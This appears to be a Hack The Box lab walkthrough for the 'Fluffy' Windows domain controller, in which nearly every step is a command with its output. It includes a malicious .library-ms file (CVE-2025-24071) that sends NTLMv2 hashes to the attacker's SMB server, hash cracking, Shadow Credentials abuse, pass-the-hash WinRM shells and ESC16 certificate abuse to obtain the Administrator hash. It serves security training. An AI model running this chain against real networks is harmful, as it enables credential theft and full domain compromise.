---
title: Fluffy - Walkthrough Only
date: 03-02-2026
tags:
  - HTB
  - Windows
  - Easy
---
![[Fluffy_Machine_Image.png]]
# 🎯 Summary
**Fluffy** is a Hack The Box machine focused on Windows **Active Directory** ACLs and certificates vulnerabilities. It allows you to practice **CVE-2025-24071** vulnerability, password hashes cracking, domain enumeration, and **certificates abuse**. The vertical privilege escalation is obtained via **Shadow Credentials** and leveraging the **ESC16** misconfiguration.

The following tools were utilised to compromise the machine from initial access to root:
- [**Nmap:**](https://nmap.org) Service Discovery and Port Identification 
- **[NetExec](https://www.netexec.wiki/) / [Smbclient:](https://linux.die.net/man/1/smbclient)**:SMB Share Discovery and Interaction
- [**Responder**](https://github.com/camopants/igandx-Responder/tree/master): NTLMv2 Hash Interception
- [**Hashcat:**](https://hashcat.net/hashcat/): NTLMv2 Hash Cracking
- [**BloodHound**](https://specterops.io/bloodhound-community-edition/): Domain Enumeration
- **[PyWhisker](https://github.com/ShutdownRepo/pywhisker/blob/main/pywhisker/pywhisker.py)**: Shadow Credentials Implementation
- [**Faketime**](https://www.unix.com/man_page/debian/1/faketime/):  System Time Synchronization 
- [**Certipy-AD**](https://github.com/ly4k/Certipy): Abusing Active Directory Certificate Services
- [**Evil-WinRM:**](https://github.com/Hackplayers/evil-winrm) Remote Access on the host

# 🔍 Reconnaissance
The first step is always to scan the services exposed by the target host to try to discover our **possible foothold** in the system.
We can use `Nmap` to complete the task: 
```
$ nmap -Pn -n -p- -sV -sC 10.129.232.88 -oA Scans/fluffy
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 10:48 +0100
Nmap scan report for 10.129.232.88
Host is up (0.020s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-02 16:50:27Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-02T16:51:56+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-03-02T16:51:57+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-02T16:51:56+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-02T16:51:57+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-02T16:51:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.87 seconds


```

The scan output shows that the target host underlying running OS is Windows, it is a **Domain Controller** (DC01) of the domain "**fluffy.htb**" and that there is a **clock-skew** of about seven (7) hours.
Looking at the **open** ports, see that the tool identified **Kerberos** at ports 88 and 464, **SMB** at ports 139 and 445, **LDAP** at ports 389, 636, 3268 and 3269 as well as **WinRM** on port 5985.

The machine already provide us with domain credentials for the user "j.fleischman" having "J0elTHEM4n1990!" as the password.
Our enumeration starts querying the SMB service with the `NetExec` tool to identify any possible **shared folder** and permissions granted on them:
```
$ nxc smb 10.129.232.88 -u "j.fleischman" -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share 
```

We discover that the user j.fleischman has **READ** and **WRITE** access to the **IT** shared folder, so we start to investigate from there.
Exploring the content of the folder with the `smbclient` tool  we discover the PDF file "Upgrade_Notice.pdf" and proceed to download it:
```
$ smbclient //10.129.232.88/IT -U "j.fleischman" 
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar  2 17:59:26 2026
  ..                                  D        0  Mon Mar  2 17:59:26 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 2022600 blocks available
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (1106,5 KiloBytes/sec) (average 1106,5 KiloBytes/sec)
```

The document is an internal memo that specifies all the recent discovered **vulnerabilities** that could affect the target system, requesting immediate patching.
![[Vulnerabilities_in_PDF_file.png]]

Searching online the CVEs listed in the PDF we discover that **[CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)** is a vulnerability that permit an attacker to obtain the **NTLMv2 hash** of an user. This attack involves uploading on a SMB shared folder (where we have **WRITE** privileges) a malicious .library-ms file in a ZIP archive that point to an SMB server controlled by us.
If a user will extract the file in the ZIP archive, it will permit us to intercept its NTLMv2 hash.
# ⚔️ Exploitation
To execute this attack we start initiating a `Responder` session on our testing environment, as **root**, to intercept any SMB request done to us:
```
$ sudo responder -I tun0 -wFv
[sudo] password di luca: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Responder IPv6             [dead:beef:2::1006]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-GSS1W0EQ8Y7]
    Responder Domain Name      [ISSX.LOCAL]
    Responder DCE-RPC Port     [47568]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...               
```

The next step is to create the **malicious .library-ms** file that will instructs Windows to connect to our remote SMB share:
```
$ cat malicious.library-ms 
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.8\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

With all ready we put the created file in a ZIP archive and proceed to upload it on the IT SMB share using the `smbclient` tool:
```
$ zip -r Photos.zip  malicious.library-ms
  adding: malicious.library-ms (deflated 49%)

$ smbclient //10.129.232.88/IT -U "j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar  2 19:03:14 2026
  ..                                  D        0  Mon Mar  2 19:03:14 2026
  Everything-1.4.1.1026.x64           D        0  Mon Mar  2 19:03:08 2026
  Everything-1.4.1.1026.x64.zip       A      379  Mon Mar  2 18:46:18 2026
  KeePass-2.58                        D        0  Mon Mar  2 19:03:14 2026
  KeePass-2.58.zip                    A      379  Mon Mar  2 18:41:02 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 2242164 blocks available
smb: \> put Photos.zip 
putting file Photos.zip as \Photos.zip (6,0 kB/s) (average 6,0 kB/s)
```

In less than a minute an user extracted the files from our ZIP archive, activating our exploit and connecting back to us where `Responder` intercepts the login request, providing the domain user **FLUFFY\p.agila hash**:
```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:35461f04570e8498:7e23ff84329c0f5ca0<SNIP>...000000   
```

After storing the captured hash in a file named "p.agilahash" we process it with `Hashcat` to try to obtain its clear text value:
```
$ hashcat -a 0 -m 5600 p.agilahash /usr/share/wordlists/rockyou.txt.gz -D 1,2       

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

P.AGILA::FLUFFY:35461f04570e8498:7e23ff84329c0f5ca0<SNIP>...000000:prxxxxxxxxxxx03
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:35461f04570e8498:7e23ff84329c0f5ca0...000000
Time.Started.....: Mon Mar  2 12:10:12 2026 (1 sec)
Time.Estimated...: Mon Mar  2 12:10:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5346.9 kH/s (11.48ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#03........:  1240.0 kH/s (2.66ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  6586.9 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4866048/14344385 (33.92%)
Rejected.........: 0/4866048 (0.00%)
Restore.Point....: 4390912/14344385 (30.61%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: pwood8 -> papers62
Candidates.#03...: ozlem0 -> oursx2
Hardware.Mon.#01.: Temp: 54c Util: 27% Core:1097MHz Mem:2505MHz Bus:8
Hardware.Mon.#03.: Temp: 85c Util: 54%

Started: Mon Mar  2 12:10:11 2026
Stopped: Mon Mar  2 12:10:15 2026
```

The hash offline cracking process is **successful** so we obtained a second valid pair of domain credentials.
We immediately take advantage of them, utilizing  `BloodHound-python` to **enumerate the domain**:
```
$ bloodhound-python -u "p.agila" -p 'prxxxxxxxxxxx03' -ns 10.129.232.88 -d fluffy.htb -c all 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::1df
INFO: Trying LDAP connection to dead:beef::1df
INFO: Testing resolved hostname connectivity dead:beef::dd53:2bf7:90de:1176
INFO: Trying LDAP connection to dead:beef::dd53:2bf7:90de:1176
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::1df
INFO: Trying LDAP connection to dead:beef::1df
INFO: Testing resolved hostname connectivity dead:beef::dd53:2bf7:90de:1176
INFO: Trying LDAP connection to dead:beef::dd53:2bf7:90de:1176
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 05S
```

Obtained all the JSON files as `BloodHound-python` output,  we add them to a ZIP archive for the upload on our `BloodHound` local istance:
```
zip -r fluffy_domain *.json 
  adding: 20260302121552_computers.json (deflated 73%)
  adding: 20260302121552_containers.json (deflated 93%)
  adding: 20260302121552_domains.json (deflated 76%)
  adding: 20260302121552_gpos.json (deflated 85%)
  adding: 20260302121552_groups.json (deflated 94%)
  adding: 20260302121552_ous.json (deflated 68%)
  adding: 20260302121552_users.json (deflated 93%)
```

Once initiated the `BloodHound` session we upload the ZIP archive and move to the "Explore" section to search the "p.agila" user and mark it as owned:
![[p.agila_owned.png]]

Checking in the user proprieties we discover that it is a member of the "Service Account Managers" domain group that in turn as "**GenericAll**" ACL privilege over the "**Service Accounts**" domain group; this means that we can add the p.agila user to the "Service Accounts" group, to **inherit** the group privileges.
![[Permissions_on_service_accounts.png]]

To add the user to the "Service Accounts" group we utilize the SMB's `net` tool as follow:
```
$ net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prxxxxxxxxxxx03" -S "dc01.fluffy.htb"

$ net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prxxxxxxxxxxx03" -S "dc01.fluffy.htb"         
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

Verifying the inherited privileges we discover that we gained "**GenericWrite**" permission on three (3) domain service accounts: **LDAP_SVC**, **CA_SVC** and **WINRM_SVC**.
![[Rights_On_SVC_Accounts.png]]

As suggested by `BloodHound`, we can abuse this permission on the SVC accounts through the **Shadow Credentials** technique to extrapolate the account's certificate utilizing the `pywhisker.py` tool:
```
$ python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prxxxxxxxxxxx03" --target "LDAP_SVC" --action "add"
[*] Searching for the target account
[*] Target user found: CN=ldap service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
<SNIP>
[+] PFX exportiert nach: iRk2Mu6y.pfx
[i] Passwort für PFX: pcY6s2FYiJLV2GQOUrh0
[+] Saved PFX (#PKCS12) certificate & key at path: iRk2Mu6y.pfx
[*] Must be used with password: pcY6s2FYiJLV2GQOUrh0
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

$ python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prxxxxxxxxxxx03" --target "WINRM_SVC" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
<SNIP>
[+] PFX exportiert nach: 5I4nYH6K.pfx
[i] Passwort für PFX: bv7YdEGo93COcpdItvPW
[+] Saved PFX (#PKCS12) certificate & key at path: 5I4nYH6K.pfx
[*] Must be used with password: bv7YdEGo93COcpdItvPW
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools  
                                     
$ python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prxxxxxxxxxxx03" --target "CA_SVC" --action "add"
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
<SNIP>
[+] PFX exportiert nach: gpzDddut.pfx
[i] Passwort für PFX: CUuq6H1ehN1OteLODNx9
[+] Saved PFX (#PKCS12) certificate & key at path: gpzDddut.pfx
[*] Must be used with password: CUuq6H1ehN1OteLODNx9
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Having the certificates, as also suggested in the tool output, we proceed to request the **Ticket Granting Ticket (TGT)** for the SVC accounts to try to crack offline them and recover the clear text value of the account's password.
To request the TGTs we utilize the `certipy-ad` tool wrapped with the `Faketime` tool to avoid issues with the time mismatch (clock-skew) between our testing environment and the target Domain Controller (DC); this is due to Kerberos having a strict 5-minute time-sync requirement.
Before starting the `certipy-ad` tool we need to query the DC to obtain its date and time that will be set as the argument of the `Faketime` tool:
```
ntpdate -q 10.129.232.88
2026-03-02 21:50:12.830207 (+0100) +25200.547804 +/- 0.010405 10.129.232.88 s1 no-leap
```

Obtained the date and time values we proceed to request the TGTs for the accounts:
```
faketime -f "2026-03-02 21:50:12" certipy-ad auth -pfx 5I4nYH6K.pfx -password bv7YdEGo93COcpdItvPW -dc-ip 10.129.232.88 -username WINRM_SVC -domain fluffy.htb
<SNIP>
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404xxxxx3b435b51404ee:33bdxxxxxxxxxxxxxxxxxxxxxxxx5767

$ faketime -f "2026-03-02 21:59:12" certipy-ad auth -pfx gpzDddut.pfx -password CUuq6H1ehN1OteLODNx9  -dc-ip 10.129.232.88 -username CA_SVC -domain fluffy.htb 
<SNIP>
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404xxxxx3b435b51404ee:ca0fxxxxxxxxxxxxxxxxxxxxxxxx98c8                                                                                                                                       
$ faketime -f "2026-03-02 21:59:12" certipy-ad auth -pfx iRk2Mu6y.pfx -password pcY6s2FYiJLV2GQOUrh0 -dc-ip 10.129.232.88 -username LDAP_SVC -domain fluffy.htb 
>SNIP>
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Got hash for 'ldap_svc@fluffy.htb': aad3b435b51404xxxxx3b435b51404ee:2215xxxxxxxxxxxxxxxxxxxxxxxx3a37
```

To process all the hashes with `Hashcat` in one shot, we create the "svchashes" file to store them in an `Hashcat` readable format:
```
cat svchashes
winrm_svc@fluffy.htb:33bdxxxxxxxxxxxxxxxxxxxxxxxx5767
ca_svc@fluffy.htb:ca0fxxxxxxxxxxxxxxxxxxxxxxxx98c8
ldap_svc@fluffy.htb:2215xxxxxxxxxxxxxxxxxxxxxxxx3a37
```

After starting the hash offline cracking operation, the tool returns that **no hash** was recovered:
```
 $ hashcat -a 0 -m 1000 svchashes /usr/share/wordlists/rockyou.txt.gz -D 1,2 --user     

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: svchashes
Time.Started.....: Mon Mar  2 15:05:12 2026 (2 secs)
Time.Estimated...: Mon Mar  2 15:05:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4770.9 kH/s (5.72ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#03........:  2779.8 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  7550.7 kH/s
Recovered........: 0/3 (0.00%) Digests (total), 0/3 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14120473/14344385 (98.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 028702953 -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: 029693436 -> 028703
Hardware.Mon.#01.: Temp: 55c Util: 33% Core:1097MHz Mem:2505MHz Bus:8
Hardware.Mon.#03.: Temp: 72c Util: 30%

Started: Mon Mar  2 15:05:11 2026
Stopped: Mon Mar  2 15:05:16 2026
```
 
Having the hashes of the accounts enable us to access the system and execute enumeration/exploit tools utilizing the **Pass the Hash** technique.
As our next step we gain a shell on the target DC setting `Evil-WinRM` to connect on port 5895 with the WINRM_SVC credentials:
```
$ evil-winrm -i 10.129.232.88 -u "WINRM_SVC" -H '33bdxxxxxxxxxxxxxxxxxxxxxxxx5767'                  

<SNIP>
                 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> hostname
DC01
```

# 🚩 Post-Exploitation
Exploring the filesystem as the WINRM_SVC user we discover the **user.txt** file under its profile Desktop folder, revealing the **first flag**:
```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls ../Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         3/2/2026   7:17 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ../Desktop/user.txt
fb46xxxxxxxxxxxxxxxxxxxxxxxx417f
```

Being aware that the CA_SVC account exist on the system, we utilize the `NetExec` tool to confirm the presence of an **Active Directory Certificate Servicies (AD CS)** running on the target DC:
```
$ nxc ldap 10.129.232.88 -u "winrm_svc" -H "33bdxxxxxxxxxxxxxxxxxxxxxxxx5767" -M adcs
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\winrm_svc:33bdxxxxxxxxxxxxxxxxxxxxxxxx5767 
ADCS        10.129.232.88   389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.232.88   389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.129.232.88   389    DC01             Found CN: fluffy-DC01-CA
```

The output of the command confirms our expectations leading us to utilize again the `certipy-ad` tool to enumerate a possible ADCS's vulnerable template to abuse, trying to capture the NTLMv2 hash of  any user that requests a certificate:
```
$ certipy-ad find  -dc-ip 10.129.232.88 -username CA_SVC  -hashes 'ca0fxxxxxxxxxxxxxxxxxxxxxxxx98c8' -vulnerable -enabled -stdout

<SNIP>


    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

The command returns that **no templates** are vulnerable but it identified the **ESC16** vulnerability that we can exploit to request the **administrator NTLM hash**.
The first step is to modify the UPN name assigned to the CA_SVC account using `certipy-ad`, but first we have to verify the original UPN value to be able to **restore** the account attribute at the end of the attack:
```
$ certipy-ad account -u 'winrm_svc' -hashes '33bdxxxxxxxxxxxxxxxxxxxxxxxx5767' -dc-ip 10.129.232.88 -user ca_svc read            
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2026-03-02T20:58:45+00:00
```

Retrieved the original value, we proceed to modify the UPN attribute setting "administrator" as its new value:
```
$ certipy-ad account -u 'winrm_svc' -hashes '33bdxxxxxxxxxxxxxxxxxxxxxxxx5767' -dc-ip 10.129.232.88 -upn 'administrator' -user ca_svc update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

With the attack preparation done, we request the Administrator account certificate using `certipy-ad` wrapped with `Faketime` to avoid the clock-skew issue:
```
$ faketime -f "2026-03-02 23:30:15" certipy-ad req -k -dc-ip 10.129.232.88 -u "ca_svc@fluffy.htb" -hashes 'ca0fxxxxxxxxxxxxxxxxxxxxxxxx98c8' -dc-host dc01 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'user'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

<SNIP>

[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Retrieved the administrator's certificate, before extracting the NTLM hash, we restore the CA_SVC's UPN attribute to its **original** value:
```
$ certipy-ad account -u "winrm_svc" -hashes '33bdxxxxxxxxxxxxxxxxxxxxxxxx5767' -dc-ip 10.129.232.88 -user ca_svc -upn 'ca_svc@fluffy.htb' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

As last step of our attack we take advantage of the gained certificate and proceed to request the TGT for the ***Administrator*** account, to obtain its **NTLM hash**, utilizing for the last time `certipy-ad`:
```
$ faketime -f "2026-03-02 23:43:06" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -u Administrator -domain fluffy.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404xxxxx3b435b51404ee:8da8xxxxxxxxxxxxxxxxxxxxxxxx2a6e
```

Having the hash of the administrator account, we can directly utilize it with `Evil-WinRM` to login into the target DC and retrive the content of the **root.txt** file under the Desktop folder:
```
$ evil-winrm -i 10.129.232.88 -u "Administrator" -H '8da8xxxxxxxxxxxxxxxxxxxxxxxx2a6e' 

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
